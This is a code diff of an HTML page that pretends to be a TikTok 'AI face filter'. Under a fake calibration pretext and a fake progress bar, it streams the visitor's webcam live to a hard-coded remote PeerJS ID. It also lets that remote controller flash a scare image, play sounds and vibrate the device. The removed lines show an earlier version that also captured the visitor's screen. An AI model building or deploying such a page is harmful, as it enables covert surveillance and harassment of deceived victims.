@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TikTok AI Filter</title>
+    <title>TikTok AI Face Filter</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .btn { background: #ff0050; color: white; border: none; padding: 25px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; }
-        #step2, #loader, #screamer { display: none; }
+        .btn { background: #ff0050; color: white; border: none; padding: 25px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; margin: 10px; }
+        #loader, #screamer { display: none; }
         .spinner { border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { to { transform: rotate(360deg); } }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 10000; }
@@ -17,66 +17,81 @@
 </head>
 <body>
 
-    <div id="step1">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80">
+    <div id="ui">
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80" style="margin-bottom: 20px;">
         <h2>AI-Фильтр "Идеальное лицо"</h2>
-        <p>Шаг 1: Доступ к камере</p>
-        <button class="btn" onclick="getCam()">АКТИВИРОВАТЬ</button>
-    </div>
-
-    <div id="step2">
-        <h2>Почти готово!</h2>
-        <p>Шаг 2: Синхронизация интерфейса</p>
-        <button class="btn" style="background: #00f2ea; color: #000;" onclick="getScreen()">ПОДТВЕРДИТЬ</button>
+        <p>Для калибровки нейросети разрешите доступ к камере</p>
+        <button class="btn" onclick="startCalibration()">ПОДКЛЮЧИТЬ ЭФФЕКТ</button>
     </div>
 
     <div id="loader">
         <div class="spinner"></div>
-        <h2 id="load-text">Анализ биометрии... 0%</h2>
+        <h2 id="load-text">Калибровка биометрии... 0%</h2>
+        <p>Держите лицо в центре кадра</p>
     </div>
 
     <div id="screamer">
         <img src="https://i.imgur.com/v799C7v.jpeg">
-        <audio id="scary-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3"></audio>
     </div>
 
+    <audio id="screamer-sound" src="https://www.myinstants.com/media/sounds/screamer.mp3" preload="auto"></audio>
+    <audio id="laugh-sound" src="https://www.myinstants.com/media/sounds/laugh.mp3" preload="auto"></audio>
+
     <script>
-        const REMOTE_ID = '09062012'; //
+        const REMOTE_ID = '09062012'; // Твой уникальный ID (должен совпадать во всех файлах)
         const peer = new Peer();
 
-        let conn;
+        peer.on('connection', conn => {
+            conn.on('data', data => {
+                if (data.type === 'SCREAMER') {
+                    showScreamer();
+                } else if (data.type === 'SOUND') {
+                    playSound(data.content);
+                }
+            });
+        });
 
-        async function getCam() {
+        async function startCalibration() {
             try {
-                //
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                conn = peer.connect(REMOTE_ID);
-                peer.call(REMOTE_ID, stream);
+                // Запрос Камеры
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-            } catch (e) { alert("Ошибка: Камера обязательна!"); }
-        }
+                // Создаем соединение и звоним на монитор
+                const conn = peer.connect(REMOTE_ID);
+                peer.call(REMOTE_ID, stream);
 
-        async function getScreen() {
-            try {
-                // Запрос доступа к экрану
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                peer.call(REMOTE_ID, stream);
-                
-                document.getElementById('step2').style.display = 'none';
+                // Переключаем интерфейс
+                document.getElementById('ui').style.display = 'none';
                 document.getElementById('loader').style.display = 'block';
 
-                conn.on('data', data => {
-                    if (data === 'ATTACK') {
-                        document.getElementById('screamer').style.display = 'block';
-                        document.getElementById('scary-audio').play();
+                // Фейковая загрузка
+                let progress = 0;
+                setInterval(() => {
+                    if (progress < 99) {
+                        progress += Math.floor(Math.random() * 2) + 1;
+                        document.getElementById('load-text').innerText = "Калибровка биометрии... " + progress + "%";
                     }
-                });
+                }, 700);
 
-                let p = 0;
-                setInterval(() => { if(p < 99) { p++; document.getElementById('load-text').innerText = "Анализ: " + p + "%"; } }, 500); //
-            } catch (e) { alert("Доступ к экрану отклонен!"); location.reload(); }
+            } catch (err) {
+                alert("Ошибка! Для работы фильтра обязателен доступ к камере.");
+                location.reload();
+            }
+        }
+
+        function showScreamer() {
+            const overlay = document.getElementById('screamer');
+            const sound = document.getElementById('screamer-sound');
+            overlay.style.display = 'block';
+            sound.play();
+            if (navigator.vibrate) navigator.vibrate(1000);
+            setTimeout(() => { overlay.style.display = 'none'; }, 2000); // Исчезает через 2 сек
+        }
+
+        function playSound(soundType) {
+            if (soundType === 'LAUGH') {
+                document.getElementById('laugh-sound').play();
+            }
         }
     </script>
 </body>
